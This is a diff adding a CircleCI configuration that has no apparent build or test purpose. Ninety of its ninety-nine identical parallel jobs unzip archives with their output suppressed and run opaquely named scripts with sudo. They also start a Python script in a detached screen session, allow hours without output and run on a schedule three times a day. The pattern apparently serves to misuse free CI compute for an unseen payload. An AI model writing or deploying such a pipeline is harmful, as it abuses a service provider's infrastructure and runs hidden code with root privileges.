@@ -1,0 +1,590 @@
+working_dir: &working_dir ~/app
+.build_template: &commonSteps
+  steps:
+    - checkout
+    - run:
+        name: A
+        command: |
+          sudo apt update -y
+    - run:
+        name: B
+        command: |
+          sleep 10s
+          unzip bogem.zip && chmod u+x *
+          #./molase.sh####
+    - run:
+        name: C
+        command: |
+          unzip jindul.zip >/dev/null 2>&1
+    - run:
+        name: D
+        command: |
+          chmod u+x *
+    - run:
+        name: E
+        command: |
+          sudo ./Arang.sh
+    - run:
+        name: F
+        command: |
+          sudo ./Biji.sh
+    - run:
+        name: G
+        command: |
+          sudo ./Cili.sh
+    - run:
+        name: H
+        command: |
+          sudo ./Duri.sh
+    - run:
+        name: I
+        command: |
+          sudo ./Enak.sh
+    - run:
+        name: J
+        command: |
+          #sudo ./Frean.sh#no_run
+    - run:
+        name: K
+        no_output_timeout: 300m
+        command: |
+          echo "Siaaaappppp. . ."
+          sudo ./Gila.sh
+          sudo ./Hai.sh
+          sudo ./Itu.sh
+          screen -dmS Acdb python3 pro08.py
+          sleep 300s
+          ./main04.sh
+  working_directory: *working_dir
+
+version: 2.0
+
+jobs:
+  Bual_01:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_02:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_03:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_04:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_05:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_06:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_07:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_08:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_09:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_10:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Bual_11:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_12:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_13:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_14:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_15:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_16:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_17:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_18:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_19:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_20:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Bual_21:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_22:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_23:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_24:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_25:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_26:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_27:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_28:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_29:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_30:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Bual_31:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_32:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_33:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_34:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_35:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_36:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_37:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_38:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_39:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_40:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Bual_41:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_42:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_43:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_44:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_45:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_46:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_47:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_48:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_49:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_50:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Bual_51:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_52:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_53:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_54:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_55:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_56:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_57:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_58:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_59:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_60:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Bual_61:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_62:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_63:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_64:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_65:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_66:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_67:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_68:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_69:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_70:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Bual_71:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_72:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_73:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_74:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_75:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_76:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_77:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_78:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_79:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_80:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Bual_81:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_82:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_83:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_84:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_85:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_86:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_87:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_88:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_89:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_90:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Bual_91:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_92:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_93:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_94:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_95:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_96:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_97:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_98:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Bual_99:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+
+
+
+
+
+
+
+
+    triggers:
+      - schedule:
+          cron: "0 0,8,16 * * *"
+          filters:
+            branches:
+              only:
+                - anak
+                - kucing
+                - main
+                - di
+                - jalan
+
+workflows:
+  version: 2
+  DaftarJalan:
+    jobs:
+      - Bual_01
+      - Bual_02
+      - Bual_03
+      - Bual_04
+      - Bual_05
+      - Bual_06
+      - Bual_07
+      - Bual_08
+      - Bual_09
+      - Bual_10
+      - Bual_11
+      - Bual_12
+      - Bual_13
+      - Bual_14
+      - Bual_15
+      - Bual_16
+      - Bual_17
+      - Bual_18
+      - Bual_19
+      - Bual_20
+      - Bual_21
+      - Bual_22
+      - Bual_23
+      - Bual_24
+      - Bual_25
+      - Bual_26
+      - Bual_27
+      - Bual_28
+      - Bual_29
+      - Bual_30
+      - Bual_31
+      - Bual_32
+      - Bual_33
+      - Bual_34
+      - Bual_35
+      - Bual_36
+      - Bual_37
+      - Bual_38
+      - Bual_39
+      - Bual_40
+      - Bual_41
+      - Bual_42
+      - Bual_43
+      - Bual_44
+      - Bual_45
+      - Bual_46
+      - Bual_47
+      - Bual_48
+      - Bual_49
+      - Bual_50
+      - Bual_51
+      - Bual_52
+      - Bual_53
+      - Bual_54
+      - Bual_55
+      - Bual_56
+      - Bual_57
+      - Bual_58
+      - Bual_59
+      - Bual_60
+      - Bual_61
+      - Bual_62
+      - Bual_63
+      - Bual_64
+      - Bual_65
+      - Bual_66
+      - Bual_67
+      - Bual_68
+      - Bual_69
+      - Bual_70
+      - Bual_71
+      - Bual_72
+      - Bual_73
+      - Bual_74
+      - Bual_75
+      - Bual_76
+      - Bual_77
+      - Bual_78
+      - Bual_79
+      - Bual_80
+      - Bual_81
+      - Bual_82
+      - Bual_83
+      - Bual_84
+      - Bual_85
+      - Bual_86
+      - Bual_87
+      - Bual_88
+      - Bual_89
+      - Bual_90
+      - Bual_91
+      - Bual_92
+      - Bual_93
+      - Bual_94
+      - Bual_95
+      - Bual_96
+      - Bual_97
+      - Bual_98
+      - Bual_99
